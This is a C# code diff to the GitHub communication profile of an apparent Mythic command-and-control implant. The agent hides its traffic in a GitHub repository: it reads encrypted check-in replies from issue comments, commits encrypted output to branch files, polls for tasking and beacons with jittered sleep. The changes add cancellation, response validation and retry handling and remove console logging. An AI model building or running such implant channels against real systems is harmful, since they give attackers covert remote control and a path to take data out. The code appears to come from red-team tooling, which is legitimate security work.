@@ -37,6 +37,7 @@ namespace Agent.Profiles
         {
             this.crypt = crypto;
             this.agentConfig = config;
+            this.logger = logger;
             this.messageManager = messageManager;
             var opts = JsonSerializer.Deserialize(
                 ChannelConfig.Decode(),
@@ -77,14 +78,16 @@ namespace Agent.Profiles
             do
             {
                 // Relax.. wait for Mythic to post a checkin response (cir) to GitHub for the agent to retrieve 
-                await Task.Delay(3000);
+                await Task.Delay(3000, cancellationTokenSource.Token);
 
                 List<string> comments = await GetComments();
-                // there should only be one valid comment returned since it's the checkin response
-                if (comments.Count == 1)
+                CheckinResponse? response = comments
+                    .Select(ParseCheckinResponse)
+                    .FirstOrDefault(candidate => candidate is not null);
+                if (response is not null)
                 {
                     this.checkedin = true;
-                    this.cir = JsonSerializer.Deserialize<CheckinResponse>(comments[0]);
+                    this.cir = response;
                     return this.cir;
                 }
                 currentAttempt++;
@@ -101,7 +104,6 @@ namespace Agent.Profiles
             //Main beacon loop handled here
             Console.WriteLine($"Start beacon UUID: {agentConfig.uuid}");
 
-            this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
                 // Create new branch
@@ -116,15 +118,20 @@ namespace Agent.Profiles
                 string agentSha = "";
                 try
                 {
-                    string message = this.crypt.Encrypt(messageManager.GetAgentResponseString());
-                    Console.WriteLine("Message to Mythic!");
-                    Console.WriteLine(message);
-                    var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
-                    var result = await client.Repository.Content.CreateFile(OWNER, REPO, "server.txt", createRequest);
-                    agentSha = result.Commit.Sha;
+                    agentSha = await messageManager.DeliverAsync(
+                        async payload =>
+                        {
+                            string message = this.crypt.Encrypt(payload);
+                            var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
+                            var result = await client.Repository.Content.CreateFile(OWNER, REPO, "server.txt", createRequest);
+                            return result.Commit.Sha;
+                        },
+                        sha => !string.IsNullOrEmpty(sha));
+                    this.currentAttempt = string.IsNullOrEmpty(agentSha) ? this.currentAttempt + 1 : 0;
                 }
                 catch (Exception e)
                 {
+                    this.currentAttempt++;
                     Console.WriteLine($"{e.Message}");
                 }
 
@@ -135,7 +142,7 @@ namespace Agent.Profiles
                 bool isSuccessful = false;
                 do
                 {
-                    await Task.Delay(3000);
+                    await Task.Delay(3000, cancellationTokenSource.Token);
                     try
                     {
                         var branch = await client.Repository.Branch.Get(OWNER, REPO, agentConfig.uuid);
@@ -162,12 +169,11 @@ namespace Agent.Profiles
                 {
                     var fileContents = await client.Repository.Content.GetAllContentsByRef(OWNER, REPO, "client.txt", agentConfig.uuid);
                     string mythResp = this.crypt.Decrypt(fileContents[0].Content);
-                    Console.WriteLine(mythResp);
-                    GetTaskingResponse gtr = JsonSerializer.Deserialize(mythResp, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    if (gtr != null)
+                    GetTaskingResponse? gtr = ParseTaskingResponse(mythResp);
+                    if (gtr is not null)
                     {
                         TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                        this.SetTaskingReceived(null, tra);
+                        this.SetTaskingReceived?.Invoke(this, tra);
                     }
                 }
                 catch (NotFoundException)
@@ -197,7 +203,7 @@ namespace Agent.Profiles
                     Console.WriteLine($"An error occurred while deleting the branch: {ex.Message}");
                 }
                 // Rest
-                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
+                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
             }
         }
 
@@ -205,6 +211,58 @@ namespace Agent.Profiles
         {
             this.cancellationTokenSource.Cancel();
             return true;
+        }
+
+        private CheckinResponse? ParseCheckinResponse(string content)
+        {
+            try
+            {
+                CheckinResponse? response = JsonSerializer.Deserialize(content, CheckinResponseJsonContext.Default.CheckinResponse);
+                return CheckinResponseValidation.IsSuccessful(response) ? response : null;
+            }
+            catch (JsonException)
+            {
+                return null;
+            }
+        }
+
+        private GetTaskingResponse? ParseTaskingResponse(string content)
+        {
+            GetTaskingResponse? response = JsonSerializer.Deserialize(content, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+            return response?.action == "get_tasking" ? response : null;
+        }
+
+        private bool TryDecodeOwnedComment(string body, out string plaintext)
+        {
+            plaintext = string.Empty;
+            try
+            {
+                string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(body));
+                if (decoded.Length < 36 || decoded[..36] != agentConfig.uuid)
+                {
+                    return false;
+                }
+
+                plaintext = crypt.Decrypt(body);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        private List<string> DecodeOwnedComments(IEnumerable<string> bodies)
+        {
+            var decoded = new List<string>();
+            foreach (string body in bodies)
+            {
+                if (TryDecodeOwnedComment(body, out string plaintext))
+                {
+                    decoded.Add(plaintext);
+                }
+            }
+            return decoded;
         }
 
         internal async Task<List<string>> GetComments()
@@ -217,12 +275,9 @@ namespace Agent.Profiles
                 var all_comments = await client.Issue.Comment.GetAllForIssue(OWNER, REPO, SERVER_ISSUE);
                 foreach (var comment in all_comments)
                 {
-                    // check if message is for us
-                    var msg = Encoding.UTF8.GetString(Convert.FromBase64String(comment.Body));
-                    var payloadUuid = msg.Substring(0, 36);
-                    if (payloadUuid == agentConfig.uuid)
+                    if (TryDecodeOwnedComment(comment.Body, out string plaintext))
                     {
-                        comments.Add(this.crypt.Decrypt(comment.Body));
+                        comments.Add(plaintext);
                         //delete comment
                         try
                         {
